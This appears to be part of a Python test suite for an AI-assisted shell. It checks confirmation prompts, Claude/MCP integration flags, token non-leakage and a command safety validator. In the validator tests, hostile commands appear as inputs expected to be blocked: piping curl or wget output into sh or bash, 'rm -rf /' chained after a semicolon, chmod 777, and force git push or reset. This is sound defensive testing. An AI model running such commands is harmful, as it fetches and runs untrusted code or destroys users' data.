def section_at():
    print("\n--- Section AT: @ natural-language command mode (Phase 1 mock) ---")

    def atchk(test_id, stdin_text, *, contains=None, no_crash=False):
        r = run_interactive(stdin_text)
        problems = []
        if r.timed_out:
            problems.append(f"timed out after {TIMEOUT}s")
        elif no_crash:
            if r.returncode < 0:
                problems.append(f"killed by signal (rc={r.returncode})")
        else:
            if r.returncode != 0:
                problems.append(f"expected exit 0, got {r.returncode}")
        if contains is not None and not r.timed_out and contains not in r.stdout:
            problems.append(f"stdout missing {contains!r}")
        ok = not problems
        desc = repr(stdin_text)[:60]
        _record(test_id, desc, ok,
                "" if ok else _fmt([BINARY], r, "; ".join(problems)))
        return r

    # AT001: @ + Enter (empty line) executes mock pwd; shows "Going to execute:"
    r01 = atchk("AT001",
                "@ show current directory\n\n",
                contains="Going to execute:")

    # AT001b: pwd output must include the project root path somewhere in stdout.
    # The path prints on the same line as the confirmation prompt (no preceding
    # newline), so we search for it anywhere in stdout rather than line-start.
    if not r01.timed_out:
        has_path = ROOT in r01.stdout
        _record("AT001b", "@ + Enter: pwd output contains project root path",
                has_path,
                "" if has_path else f"stdout: {r01.stdout[:300]!r}")

    # AT002: @ + non-empty input → Cancelled.
    atchk("AT002",
          "@ show current directory\nno thanks\n",
          contains="Cancelled.")

    # AT003: normal commands continue to work before and after a cancelled @
    r03 = run_interactive("echo hello\n@ something\ncancel\necho world\n")
    ok03 = (not r03.timed_out
            and "hello" in r03.stdout
            and "world" in r03.stdout
            and "Cancelled." in r03.stdout)
    _record("AT003",
            "normal commands work before and after cancelled @ command",
            ok03,
            "" if ok03 else _fmt([BINARY], r03,
                                  f"stdout: {r03.stdout[:300]!r}"))

    # AT004: bare @ without any instruction does not crash
    r04 = run_interactive("@\n")
    ok04 = not r04.timed_out and r04.returncode >= 0
    _record("AT004",
            "bare @ without instruction does not crash",
            ok04,
            "" if ok04 else _fmt([BINARY], r04, "crashed or timed out"))

    # AT005: WARN path — output redirection triggers warning, "yes" confirms
    at5_json = ('{"command":"echo hi > /dev/null","explanation":"x",'
                '"risk":"read_only","confidence":1.0}')
    at5_env  = {k: v for k, v in os.environ.items() if not k.startswith("AISHELL_")}
    at5_env.update({"AISHELL_MOCK_AI_JSON": at5_json,
                    "AISHELL_AI_BACKEND": "mock", "AISHELL_MCP_ENABLED": "0"})
    r05 = run_interactive("@ do something\nyes\n", env=at5_env)
    ok05 = (not r05.timed_out
            and "Warning:" in r05.stdout
            and "Going to execute:" in r05.stdout)
    _record("AT005",
            "@ WARN path: shows warning and executes on 'yes'",
            ok05,
            "" if ok05 else _fmt([BINARY], r05,
                                  f"stdout: {r05.stdout[:300]!r}"))

    # AT006: BLOCKED path — sudo is blocked, no confirmation offered
    at6_json = ('{"command":"sudo ls","explanation":"x",'
                '"risk":"read_only","confidence":1.0}')
    at6_env  = {k: v for k, v in os.environ.items() if not k.startswith("AISHELL_")}
    at6_env.update({"AISHELL_MOCK_AI_JSON": at6_json,
                    "AISHELL_AI_BACKEND": "mock", "AISHELL_MCP_ENABLED": "0"})
    r06 = run_interactive("@ do something\n", env=at6_env)
    ok06 = (not r06.timed_out
            and "blocked" in (r06.stdout + r06.stderr).lower()
            and "Going to execute:" not in r06.stdout)
    _record("AT006",
            "@ BLOCKED path: blocked command is rejected before confirmation",
            ok06,
            "" if ok06 else _fmt([BINARY], r06,
                                  f"stdout: {r06.stdout[:300]!r} "
                                  f"stderr: {r06.stderr[:200]!r}"))

    # AT007: WARN path cancelled — user presses Enter (not "yes") → Cancelled
    at7_json = ('{"command":"rm file.txt","explanation":"x",'
                '"risk":"read_only","confidence":1.0}')
    at7_env  = {k: v for k, v in os.environ.items() if not k.startswith("AISHELL_")}
    at7_env.update({"AISHELL_MOCK_AI_JSON": at7_json,
                    "AISHELL_AI_BACKEND": "mock", "AISHELL_MCP_ENABLED": "0"})
    r07 = run_interactive("@ delete a file\n\n", env=at7_env)
    ok07 = (not r07.timed_out
            and "Warning:" in r07.stdout
            and "Cancelled." in r07.stdout)
    _record("AT007",
            "@ WARN path: pressing Enter (not 'yes') cancels",
            ok07,
            "" if ok07 else _fmt([BINARY], r07,
                                  f"stdout: {r07.stdout[:300]!r}"))

    # ------------------------------------------------------------------
    # Phase 8: Temporary Claude Code MCP config integration
    # ------------------------------------------------------------------
    MOCK_ARGS_SCRIPT = os.path.join(ROOT, "tests", "mock_claude_args.sh")
    MOCK_ARGS_FILE   = "/tmp/aishell_mock_args.txt"
    MOCK_MCP_COPY    = "/tmp/aishell_mock_mcp_config.json"

    def clean_mock_files():
        for f in (MOCK_ARGS_FILE, MOCK_MCP_COPY):
            try:
                os.unlink(f)
            except OSError:
                pass

    def read_args_lines():
        if not os.path.exists(MOCK_ARGS_FILE):
            return []
        with open(MOCK_ARGS_FILE) as f:
            return f.read().splitlines()

    # AT008: claude + MCP disabled → no --mcp-config in argv
    clean_mock_files()
    env08 = {k: v for k, v in os.environ.items() if not k.startswith("AISHELL_")}
    env08.update({
        "AISHELL_AI_BACKEND":    "claude",
        "AISHELL_CLAUDE_PATH":   MOCK_ARGS_SCRIPT,
        "AISHELL_MCP_ENABLED":   "0",
        "AISHELL_AI_MAX_RETRIES": "0",
    })
    r08 = run_interactive("@ list current directory\nn\n", env=env08)
    lines08 = read_args_lines()
    ok08 = (not r08.timed_out
            and len(lines08) > 0
            and "--mcp-config" not in lines08)
    _record("AT008",
            "claude + MCP disabled → no --mcp-config in argv",
            ok08,
            "" if ok08 else _fmt([BINARY], r08,
                                  f"args: {lines08!r}"))

    # AT008b: MCP disabled → --allowedTools must also be absent
    ok08b = (not r08.timed_out
             and len(lines08) > 0
             and "--allowedTools" not in lines08)
    _record("AT008b",
            "claude + MCP disabled → no --allowedTools in argv",
            ok08b,
            "" if ok08b else f"args: {lines08!r}")

    # AT009-AT013: single run with MCP enabled; multiple assertions share it
    clean_mock_files()
    env09 = {k: v for k, v in os.environ.items() if not k.startswith("AISHELL_")}
    env09.update({
        "AISHELL_AI_BACKEND":      "claude",
        "AISHELL_CLAUDE_PATH":     MOCK_ARGS_SCRIPT,
        "AISHELL_MCP_ENABLED":     "1",
        "AISHELL_MCP_TOKEN":       "test-p8-tok",
        "AISHELL_MCP_PORT":        "0",
        "AISHELL_AI_MAX_RETRIES":  "0",
    })
    r09 = run_interactive("@ list current directory\nn\n", env=env09)
    lines09 = read_args_lines()

    # Locate the path that was passed after --mcp-config
    mcp_cfg_path = None
    for idx, line in enumerate(lines09):
        if line == "--mcp-config" and idx + 1 < len(lines09):
            mcp_cfg_path = lines09[idx + 1]
            break

    # AT009: --mcp-config present
    ok09 = not r09.timed_out and "--mcp-config" in lines09
    _record("AT009",
            "claude + MCP enabled → --mcp-config in argv",
            ok09,
            "" if ok09 else _fmt([BINARY], r09, f"args: {lines09!r}"))

    # AT010: --strict-mcp-config present
    ok10 = not r09.timed_out and "--strict-mcp-config" in lines09
    _record("AT010",
            "claude + MCP enabled → --strict-mcp-config in argv",
            ok10,
            "" if ok10 else f"args: {lines09!r}")

    # AT010b: --allowedTools present when MCP is enabled
    ok10b = not r09.timed_out and "--allowedTools" in lines09
    _record("AT010b",
            "claude + MCP enabled → --allowedTools in argv",
            ok10b,
            "" if ok10b else f"args: {lines09!r}")

    # AT010c: the allowedTools value is mcp__aishell__*
    allowed_value = ""
    for idx, line in enumerate(lines09):
        if line == "--allowedTools" and idx + 1 < len(lines09):
            allowed_value = lines09[idx + 1]
            break
    ok10c = allowed_value == "mcp__aishell__*"
    _record("AT010c",
            "claude + MCP enabled → allowedTools value is mcp__aishell__*",
            ok10c,
            "" if ok10c else f"got: {allowed_value!r} args: {lines09!r}")

    # AT011: temp MCP config has the expected structure
    ok11    = False
    detail11 = "copy not found"
    if os.path.exists(MOCK_MCP_COPY):
        try:
            with open(MOCK_MCP_COPY) as f:
                mcp_cfg = json.loads(f.read())
            srv = mcp_cfg["mcpServers"]["aishell"]
            ok11 = (srv.get("type") == "http"
                    and "127.0.0.1" in srv.get("url", "")
                    and srv.get("url", "").endswith("/mcp")
                    and "Authorization" in srv.get("headers", {}))
            if not ok11:
                detail11 = f"unexpected structure: {mcp_cfg}"
        except Exception as exc:
            detail11 = str(exc)
    _record("AT011",
            "temp MCP config has correct structure",
            ok11,
            "" if ok11 else detail11)

    # AT012: temp MCP config removed after Claude exits
    ok12     = False
    detail12 = f"mcp_cfg_path={mcp_cfg_path!r}"
    if mcp_cfg_path:
        ok12     = not os.path.exists(mcp_cfg_path)
        detail12 = f"path={mcp_cfg_path!r} still_exists={os.path.exists(mcp_cfg_path)}"
    _record("AT012",
            "temp MCP config removed after Claude exits",
            ok12,
            "" if ok12 else detail12)

    # AT013: MCP token not printed in stdout or stderr
    token = env09["AISHELL_MCP_TOKEN"]
    ok13  = token not in r09.stdout and token not in r09.stderr
    _record("AT013",
            "MCP token not printed in stdout or stderr",
            ok13,
            "" if ok13 else "token found in output!")

    # AT013b: progress messages appear in stderr for claude + MCP run
    ok13b_cc  = "contacting Claude Code"          in r09.stderr
    ok13b_mcp = "local MCP server enabled"        in r09.stderr
    ok13b = ok13b_cc and ok13b_mcp
    _record("AT013b",
            "claude + MCP: progress messages in stderr",
            ok13b,
            "" if ok13b else
            f"contacting={ok13b_cc} mcp_msg={ok13b_mcp} stderr={r09.stderr[:300]!r}")

    # AT014: MCP enabled + empty token → no crash (falls back gracefully)
    clean_mock_files()
    env14 = {k: v for k, v in os.environ.items() if not k.startswith("AISHELL_")}
    env14.update({
        "AISHELL_AI_BACKEND":     "claude",
        "AISHELL_CLAUDE_PATH":    MOCK_ARGS_SCRIPT,
        "AISHELL_MCP_ENABLED":    "1",
        "AISHELL_MCP_TOKEN":      "",
        "AISHELL_AI_MAX_RETRIES": "0",
    })
    r14 = run_interactive("@ list current directory\nn\n", env=env14)
    ok14 = not r14.timed_out and r14.returncode >= 0
    _record("AT014",
            "MCP enabled + empty token → no crash (safe fallback)",
            ok14,
            "" if ok14 else _fmt([BINARY], r14, "crashed or timed out"))

    # AT015: claude backend + dangerous command → still blocked by local validator
    env15 = {k: v for k, v in os.environ.items() if not k.startswith("AISHELL_")}
    env15.update({
        "AISHELL_AI_BACKEND":     "claude",
        "AISHELL_CLAUDE_PATH":    os.path.join(ROOT, "tests", "mock_claude_rm.sh"),
        "AISHELL_MCP_ENABLED":    "0",
        "AISHELL_AI_MAX_RETRIES": "0",
    })
    r15 = run_interactive("@ delete everything\n", env=env15)
    ok15 = (not r15.timed_out
            and "blocked" in (r15.stdout + r15.stderr).lower()
            and "Going to execute:" not in r15.stdout)
    _record("AT015",
            "claude backend + dangerous cmd → blocked by local validator",
            ok15,
            "" if ok15 else _fmt([BINARY], r15,
                                  f"stdout: {r15.stdout[:300]!r} "
                                  f"stderr: {r15.stderr[:200]!r}"))

    # AT016–AT018: Verify semantic self-check guidance is present in the
    # Claude prompt templates embedded in claude_client.c.  These are
    # source-inspection tests: they check that Claude will receive the correct
    # instructions without needing a live Claude session.
    client_src = os.path.join(ROOT, "src", "ai", "claude_client.c")
    try:
        with open(client_src) as _f:
            _src = _f.read()
    except OSError:
        _src = ""

    # AT016: PROMPT_WITH_MCP contains count semantic check
    ok16 = ("COUNT" in _src and "wc" in _src and "uniq -c" in _src
            and "awk" in _src and "count request" in _src)
    _record("AT016",
            "PROMPT_WITH_MCP contains count semantic check (COUNT/wc/uniq -c/awk)",
            ok16,
            "" if ok16 else "claude_client.c missing count semantic guidance")

    # AT017: PROMPT_WITH_MCP contains per-directory semantic check
    ok17 = ("PER DIRECTORY" in _src and "per directory" in _src
            and "awk array aggregation" in _src
            and "flat" in _src)
    _record("AT017",
            "PROMPT_WITH_MCP contains per-directory semantic check",
            ok17,
            "" if ok17 else "claude_client.c missing per-directory semantic guidance")

    # AT018: PROMPT_NO_MCP also contains semantic self-check guidance
    # Verify by checking that "semantic self-check" appears at least twice
    # (once in each template).
    ok18 = _src.count("semantic self-check") >= 2
    _record("AT018",
            "Both PROMPT_NO_MCP and PROMPT_WITH_MCP contain semantic self-check",
            ok18,
            "" if ok18 else
            f"'semantic self-check' appears {_src.count('semantic self-check')} "
            "time(s) in claude_client.c, expected >= 2")

    # AT019: Both prompt templates contain WC TOTAL ROW guidance
    ok19 = (_src.count("WC TOTAL ROW") >= 2
            and "xargs -n 1 wc" in _src
            and "total" in _src)
    _record("AT019",
            "Both PROMPT_NO_MCP and PROMPT_WITH_MCP contain WC TOTAL ROW guidance",
            ok19,
            "" if ok19 else
            f"'WC TOTAL ROW' appears {_src.count('WC TOTAL ROW')} time(s) in "
            "claude_client.c, expected >= 2")

    # -- Intent / out-of-scope tests (AT020–AT025) -----------------------------

    # AT020: MOCK with intent "unsupported" → prints "@ not a shell task:", no confirm prompt
    _at20_json = ('{"intent":"unsupported","command":"",'
                  '"explanation":"This is not a shell command task.",'
                  '"risk":"unknown","confidence":1.0}')
    _at20_env  = {k: v for k, v in os.environ.items() if not k.startswith("AISHELL_")}
    _at20_env.update({"AISHELL_MOCK_AI_JSON": _at20_json,
                      "AISHELL_AI_BACKEND": "mock", "AISHELL_MCP_ENABLED": "0"})
    r20 = run_interactive("@ give me a story\n", env=_at20_env)
    ok20 = (not r20.timed_out
            and "@ not a shell task:" in r20.stdout
            and "Going to execute:" not in r20.stdout)
    _record("AT020",
            "@ unsupported intent: prints '@ not a shell task:' and skips confirm",
            ok20,
            "" if ok20 else _fmt([BINARY], r20,
                                  f"stdout: {r20.stdout[:300]!r}"))

    # AT021: MOCK with explicit intent "shell_command" → normal confirm flow
    _at21_json = ('{"intent":"shell_command","command":"pwd",'
                  '"explanation":"Prints the working directory.",'
                  '"risk":"read_only","confidence":1.0}')
    _at21_env  = {k: v for k, v in os.environ.items() if not k.startswith("AISHELL_")}
    _at21_env.update({"AISHELL_MOCK_AI_JSON": _at21_json,
                      "AISHELL_AI_BACKEND": "mock", "AISHELL_MCP_ENABLED": "0"})
    r21 = run_interactive("@ show directory\n\n", env=_at21_env)
    ok21 = (not r21.timed_out
            and "Going to execute:" in r21.stdout
            and "@ not a shell task:" not in r21.stdout)
    _record("AT021",
            "@ explicit intent=shell_command: normal confirm flow",
            ok21,
            "" if ok21 else _fmt([BINARY], r21,
                                  f"stdout: {r21.stdout[:300]!r}"))

    # AT022: MOCK without intent field (4-field JSON) → backward compat, normal flow
    _at22_json = ('{"command":"pwd","explanation":"Prints the working directory.",'
                  '"risk":"read_only","confidence":1.0}')
    _at22_env  = {k: v for k, v in os.environ.items() if not k.startswith("AISHELL_")}
    _at22_env.update({"AISHELL_MOCK_AI_JSON": _at22_json,
                      "AISHELL_AI_BACKEND": "mock", "AISHELL_MCP_ENABLED": "0"})
    r22 = run_interactive("@ show directory\n\n", env=_at22_env)
    ok22 = (not r22.timed_out
            and "Going to execute:" in r22.stdout
            and "@ not a shell task:" not in r22.stdout)
    _record("AT022",
            "@ missing intent (backward compat): defaults to shell_command, normal flow",
            ok22,
            "" if ok22 else _fmt([BINARY], r22,
                                  f"stdout: {r22.stdout[:300]!r}"))

    # AT023: MOCK with invalid intent value → parse error, no confirm prompt
    _at23_json = ('{"intent":"creative_writing","command":"pwd",'
                  '"explanation":"x","risk":"read_only","confidence":0.9}')
    _at23_env  = {k: v for k, v in os.environ.items() if not k.startswith("AISHELL_")}
    _at23_env.update({"AISHELL_MOCK_AI_JSON": _at23_json,
                      "AISHELL_AI_BACKEND": "mock", "AISHELL_MCP_ENABLED": "0"})
    r23 = run_interactive("@ do something\n", env=_at23_env)
    ok23 = (not r23.timed_out
            and "Going to execute:" not in r23.stdout
            and ("invalid" in (r23.stdout + r23.stderr).lower()
                 or "error" in (r23.stdout + r23.stderr).lower()))
    _record("AT023",
            "@ invalid intent value: rejected with parse/invalid error",
            ok23,
            "" if ok23 else _fmt([BINARY], r23,
                                  f"stdout: {r23.stdout[:300]!r} "
                                  f"stderr: {r23.stderr[:200]!r}"))

    # AT024: Source-inspection: both prompt templates contain "unsupported" intent guidance
    ok24a = _src.count("unsupported") >= 2
    _record("AT024a",
            "PROMPT_NO_MCP contains 'unsupported' intent guidance",
            ok24a,
            "" if ok24a else
            f"'unsupported' appears {_src.count('unsupported')} time(s) in "
            "claude_client.c, expected >= 2")

    ok24b = "not a shell" in _src and _src.count("not a shell") >= 2
    _record("AT024b",
            "Both prompts contain 'not a shell' guidance",
            ok24b,
            "" if ok24b else
            f"'not a shell' appears {_src.count('not a shell')} time(s) in "
            "claude_client.c, expected >= 2")

    # AT025: Source-inspection: both prompts mention "five fields" (not "four fields" only)
    ok25 = _src.count("five fields") >= 2
    _record("AT025",
            "Both PROMPT_NO_MCP and PROMPT_WITH_MCP mention 'five fields'",
            ok25,
            "" if ok25 else
            f"'five fields' appears {_src.count('five fields')} time(s) in "
            "claude_client.c, expected >= 2")

    # Cleanup: remove any Phase 8 test temp files left in /tmp so they are
    # not confused with real secrets or committed accidentally.
    clean_mock_files()


# ---------------------------------------------------------------------------
# Section CC — Claude Code headless client (Phase 5)
# ---------------------------------------------------------------------------

def section_claude_client():
    print("\n--- Section CC: Claude Code headless client ---")

    def cc_run(mock_script, input_text, extra_env=None):
        """Run the REPL with the Claude backend pointed at a local mock script."""
        script_path = os.path.join(ROOT, "tests", mock_script)
        env = {
            **os.environ,
            "AISHELL_AI_BACKEND":          "claude",
            "AISHELL_CLAUDE_PATH":          script_path,
            "AISHELL_AI_MAX_RETRIES":       "0",    # no retry unless overridden
            "AISHELL_AI_RETRY_BACKOFF_MS":  "50",
        }
        if extra_env:
            env.update(extra_env)
        return run_interactive(input_text, env=env)

    def ccchk(test_id, desc, r, *,
              stdout_contains=None, stderr_contains=None,
              stdout_absent=None, stderr_absent=None):
        problems = []
        if r.timed_out:
            problems.append(f"timed out after {TIMEOUT}s")
        if stdout_contains and stdout_contains not in r.stdout:
            problems.append(f"stdout missing {stdout_contains!r}")
        if stderr_contains and stderr_contains not in r.stderr:
            problems.append(f"stderr missing {stderr_contains!r}")
        if stdout_absent and stdout_absent in r.stdout:
            problems.append(f"stdout should NOT contain {stdout_absent!r}")
        if stderr_absent and stderr_absent in r.stderr:
            problems.append(f"stderr should NOT contain {stderr_absent!r}")
        ok = not problems
        _record(test_id, desc, ok,
                "" if ok else _fmt([BINARY], r, "; ".join(problems)))

    # CC001: happy path — valid mock returns pwd JSON, user confirms, pwd runs
    r01 = cc_run("mock_claude_ok.sh", "@ show working directory\n\n")
    ccchk("CC001a", "Claude backend: shows 'Going to execute:'",
          r01, stdout_contains="Going to execute:")
    ccchk("CC001b", "Claude backend: pwd output contains project root path",
          r01, stdout_contains=ROOT)
    ccchk("CC001c", "Claude backend: progress message in stderr",
          r01, stderr_contains="contacting Claude Code")

    # CC002: missing binary → error without executing
    r02 = cc_run("nonexistent_claude_binary",
                 "@ do something\n",
                 extra_env={"AISHELL_CLAUDE_PATH": "/nonexistent/path/to/claude"})
    ccchk("CC002", "missing Claude binary prints error and does not execute",
          r02,
          stderr_contains="@ error:",
          stdout_absent="Going to execute:")

    # CC003: not-logged-in error is classified correctly and not retried
    r03 = cc_run("mock_claude_not_logged_in.sh", "@ do something\n")
    ccchk("CC003a", "not-logged-in: @ error in stderr",
          r03, stderr_contains="@ error:")
    ccchk("CC003b", "not-logged-in: not retried (no 'retrying' warning)",
          r03, stderr_absent="retrying")

    # CC004: timeout is enforced — mock sleeps 60s, we set timeout to 300ms
    r04 = cc_run("mock_claude_sleep.sh", "@ do something\n",
                 extra_env={"AISHELL_AI_TIMEOUT_MS": "300"})
    ccchk("CC004a", "timeout: @ error in stderr",
          r04, stderr_contains="@ error:")
    ccchk("CC004b", "timeout: did not execute any command",
          r04, stdout_absent="Going to execute:")

    # CC005: generic nonzero exit is retried; verify error after exhausting retries
    r05 = cc_run("mock_claude_fail.sh", "@ do something\n",
                 extra_env={"AISHELL_AI_MAX_RETRIES": "1",
                            "AISHELL_AI_RETRY_BACKOFF_MS": "50"})
    ccchk("CC005a", "retryable failure: @ error after exhausting retries",
          r05, stderr_contains="@ error:")
    ccchk("CC005b", "retryable failure: retry warning was emitted",
          r05, stderr_contains="retrying")

    # CC006: malformed JSON is rejected cleanly
    r06 = cc_run("mock_claude_bad_json.sh", "@ do something\n")
    ccchk("CC006a", "bad JSON: AI response error in stderr",
          r06, stderr_contains="AI response error")
    ccchk("CC006b", "bad JSON: no command was executed",
          r06, stdout_absent="Going to execute:")

    # CC007: dangerous command from Claude is blocked by the validator
    r07 = cc_run("mock_claude_rm.sh", "@ delete everything\n")
    ccchk("CC007a", "dangerous command: blocked in stderr",
          r07, stderr_contains="@ blocked:")
    ccchk("CC007b", "dangerous command: no confirmation prompt shown",
          r07, stdout_absent="Going to execute:")

    # CC008: warning-level command from Claude requires "yes"; Enter cancels
    r08 = cc_run("mock_claude_warn.sh", "@ remove a file\n\n")
    ccchk("CC008a", "warn command: Warning shown in stdout",
          r08, stdout_contains="Warning:")
    ccchk("CC008b", "warn command: Cancelled on plain Enter",
          r08, stdout_contains="Cancelled.")


# ---------------------------------------------------------------------------
# Section VD — AI command safety validator (Phase 4)
# ---------------------------------------------------------------------------

def section_validate():
    print("\n--- Section VD: AI command safety validator ---")

    def vd_run(command, risk="read_only", confidence=1.0):
        """Run --validate-command with the given command string and metadata."""
        extra = {
            "AISHELL_TEST_RISK":       risk,
            "AISHELL_TEST_CONFIDENCE": str(confidence),
        }
        env = {**os.environ, **extra}
        r = _run(["./aishell", "--validate-command"],
                 stdin_text=command + "\n", env=env)
        try:
            return json.loads(r.stdout.strip())
        except Exception as exc:
            return {"level": "parse_error", "reason": str(exc), "raw": r.stdout}

    def vdchk(test_id, desc, d, expected_level,
              reason_substr=None, suggestion_substr=None):
        ok = d.get("level") == expected_level
        if ok and reason_substr:
            ok = reason_substr.lower() in d.get("reason", "").lower()
        if ok and suggestion_substr:
            ok = suggestion_substr.lower() in d.get("suggestion", "").lower()
        detail = "" if ok else (
            f"expected level={expected_level!r}"
            + (f", reason contains {reason_substr!r}" if reason_substr else "")
            + (f", suggestion contains {suggestion_substr!r}"
               if suggestion_substr else "")
            + f"; got {d}"
        )
        _record(test_id, desc, ok, detail)

    # Safe read-only commands → OK
    vdchk("VD001", "pwd → ok",        vd_run("pwd"),       "ok")
    vdchk("VD002", "ls -la → ok",     vd_run("ls -la"),    "ok")
    vdchk("VD003", "echo hi → ok",    vd_run("echo hi"),   "ok")
    vdchk("VD004", "grep foo f → ok", vd_run("grep foo file.txt"), "ok")

    # Blocked: empty command
    vdchk("VD005", "empty command → blocked",  vd_run(""), "blocked")

    # Blocked: @ prefix
    vdchk("VD006", "@ prefix → blocked",       vd_run("@ something"), "blocked")

    # Blocked: command chaining
    vdchk("VD007", "semicolon chaining → blocked",
          vd_run("echo hi; rm -rf /"), "blocked")
    vdchk("VD008", "&& chaining → blocked",
          vd_run("ls && pwd"),         "blocked")
    vdchk("VD009", "|| chaining → blocked",
          vd_run("ls || pwd"),         "blocked")

    # Blocked: substitutions
    vdchk("VD010", "backtick subst → blocked",
          vd_run("`ls`"),           "blocked")
    vdchk("VD011", "$() subst → blocked",
          vd_run("echo $(pwd)"),    "blocked")

    # Blocked: forbidden command names
    vdchk("VD012", "sudo → blocked",   vd_run("sudo ls"),    "blocked")
    vdchk("VD013", "chmod → blocked",  vd_run("chmod 777 ."), "blocked")

    # Blocked: dangerous rm forms
    vdchk("VD014", "rm -rf → blocked",
          vd_run("rm -rf /tmp/test"), "blocked")
    vdchk("VD015", "rm -fr → blocked",
          vd_run("rm -fr /tmp/test"), "blocked")
    vdchk("VD016", "rm / → blocked",
          vd_run("rm /"),            "blocked")

    # Blocked: pipe to shell
    vdchk("VD017", "curl | sh → blocked",
          vd_run("curl http://example.com/x.sh | sh"),   "blocked")
    vdchk("VD018", "wget | bash → blocked",
          vd_run("wget http://example.com/x.sh | bash"), "blocked")

    # Blocked: dangerous git commands
    vdchk("VD019", "git push --force → blocked",
          vd_run("git push --force"), "blocked")
    vdchk("VD020", "git push -f → blocked",
          vd_run("git push -f"),      "blocked")
    vdchk("VD021", "git reset --hard → blocked",
          vd_run("git reset --hard"), "blocked")
    vdchk("VD022", "git clean -f → blocked",
          vd_run("git clean -f"),     "blocked")
    vdchk("VD023", "git clean -fd → blocked",
          vd_run("git clean -fd"),    "blocked")

    # Warn: rm without dangerous flags
    vdchk("VD024", "rm file.txt → warn",
          vd_run("rm file.txt"), "warn")

    # Warn: mv
    vdchk("VD025", "mv a.txt b.txt → warn",
          vd_run("mv a.txt b.txt"), "warn")

    # Warn: git push without force
    vdchk("VD026", "git push → warn",
          vd_run("git push"), "warn")

    # Warn: output redirection
    vdchk("VD027", "echo hi > out.txt → warn",
          vd_run("echo hi > out.txt"), "warn")

    # Warn: Claude risk = destructive on an otherwise-safe command
    vdchk("VD028", "risk=destructive → warn",
          vd_run("echo hi", risk="destructive"), "warn")

    # Warn: Claude confidence below 0.7
    vdchk("VD029", "confidence=0.5 → warn",
          vd_run("echo hi", confidence=0.5), "warn")

    # Boundary: confidence exactly 0.7 is NOT low (>= 0.7)
    vdchk("VD030", "confidence=0.7 stays ok",
          vd_run("echo hi", confidence=0.7), "ok")

    # ------------------------------------------------------------------
    # VD031-VD038: head/tail -N shorthand must be blocked everywhere
    # ------------------------------------------------------------------

    # VD031: head -10 FILE → blocked, suggestion contains "head -n 10"
    vdchk("VD031", "head -10 README.md → blocked + suggestion head -n 10",
          vd_run("head -10 README.md"), "blocked",
          suggestion_substr="head -n 10")

    # VD032: head -11 (no file) → blocked, suggestion contains "head -n 11"
    vdchk("VD032", "head -11 → blocked + suggestion head -n 11",
          vd_run("head -11"), "blocked",
          suggestion_substr="head -n 11")

    # VD033: tail -20 FILE → blocked, suggestion contains "tail -n 20"
    vdchk("VD033", "tail -20 README.md → blocked + suggestion tail -n 20",
          vd_run("tail -20 README.md"), "blocked",
          suggestion_substr="tail -n 20")

    # VD034: pipeline ending in head -11 → blocked
    vdchk("VD034",
          'find ... | sort -rn | head -11 → blocked + suggestion head -n 11',
          vd_run(
              'find src -name "*.c" -type f | xargs wc -l | sort -rn | head -11'
          ), "blocked",
          suggestion_substr="head -n 11")

    # VD035: pipeline ending in tail -20 → blocked
    vdchk("VD035",
          'grep -R "foo" src | tail -20 → blocked + suggestion tail -n 20',
          vd_run('grep -R "foo" src | tail -20'), "blocked",
          suggestion_substr="tail -n 20")

    # VD036: head -n 10 (correct form) → ok, no false positive
    vdchk("VD036", "head -n 10 README.md → ok (correct syntax)",
          vd_run("head -n 10 README.md"), "ok")

    # VD037: tail -n 20 (correct form) → ok
    vdchk("VD037", "tail -n 20 README.md → ok (correct syntax)",
          vd_run("tail -n 20 README.md"), "ok")

    # VD038: head inside a word ("overhead") is not a false positive
    vdchk("VD038", "word 'overhead' is not matched as head command",
          vd_run("echo overhead -10"), "ok")

    # VD039-VD043: file-path existence checks (Part B)

    # VD039: rg with a wrong path → warn + mentions "path does not exist"
    vdchk("VD039",
          "rg -n 'foo' src/mcp_server.c (wrong path) → warn",
          vd_run('rg -n "foo" src/mcp_server.c'), "warn",
          reason_substr="path does not exist")

    # VD040: rg with the correct path → ok
    vdchk("VD040",
          "rg -n 'foo' src/ai/mcp_server.c (correct path) → ok",
          vd_run('rg -n "foo" src/ai/mcp_server.c'), "ok")

    # VD041: rg with a directory argument → warn (AiShell rg does not recurse dirs)
    vdchk("VD041",
          "rg -n 'foo' src (directory arg) → warn (AiShell rg does not recurse dirs)",
          vd_run('rg -n "foo" src'), "warn",
          reason_substr="directory")

    # VD042: grep -R with directory → ok (src exists, no slash issue)
    vdchk("VD042",
          "grep -R 'foo' src → ok",
          vd_run('grep -R "foo" src'), "ok")

    # VD043: cat with a wrong path → warn + suggests find
    vdchk("VD043",
          "cat src/mcp_server.c (wrong path) → warn + suggestion",
          vd_run("cat src/mcp_server.c"), "warn",
          reason_substr="path does not exist",
          suggestion_substr="find")

    # VD044-VD047: over-escaped regex detection for rg/grep

    # VD044: rg with \| alternation → warn
    vdchk("VD044",
          r'rg -n "foo\|bar" ... → warn (over-escaped \\|)',
          vd_run(r'rg -n "foo\|bar" src/ai/mcp_server.c'), "warn",
          reason_substr="backslash alternation")

    # VD045: suggestion for over-escaped pattern mentions -e
    vdchk("VD045",
          r'rg over-escaped \\| → suggestion mentions -e',
          vd_run(r'rg -n "foo\|bar" src/ai/mcp_server.c'), "warn",
          suggestion_substr="-e")

    # VD046: rg with -e flags → blocked (AiShell rg does not support -e)
    vdchk("VD046",
          "rg -n -e pat1 -e pat2 → blocked (AiShell rg does not support -e)",
          vd_run("rg -n -e get_shell_context -e validate_command src/ai/mcp_server.c"),
          "blocked",
          reason_substr="-e")

    # VD047: rg with plain | alternation → ok (no backslash)
    vdchk("VD047",
          'rg -n "pat1|pat2" src/ai/mcp_server.c → ok (plain | is correct)',
          vd_run('rg -n "get_shell_context|validate_command" src/ai/mcp_server.c'),
          "ok")

    # VD048-VD050: rg -e flag not supported

    # VD048: rg with -e → blocked, reason mentions -e not supported
    vdchk("VD048",
          'rg -n -e "TODO" -e "FIXME" src → blocked (-e not supported)',
          vd_run('rg -n -e "TODO" -e "FIXME" src'), "blocked",
          reason_substr="-e")

    # VD049: suggestion for rg -e mentions single pattern with |
    vdchk("VD049",
          'rg -n -e "TODO" -e "FIXME" src → suggestion mentions TODO|FIXME',
          vd_run('rg -n -e "TODO" -e "FIXME" src'), "blocked",
          suggestion_substr="TODO|FIXME")

    # VD050: rg with a file path (not a directory) stays OK
    vdchk("VD050",
          'rg -n "TODO|FIXME" src/ai/mcp_server.c → ok (file arg, no -e)',
          vd_run('rg -n "TODO|FIXME" src/ai/mcp_server.c'), "ok")

    # VD051-VD052: rg directory-argument check

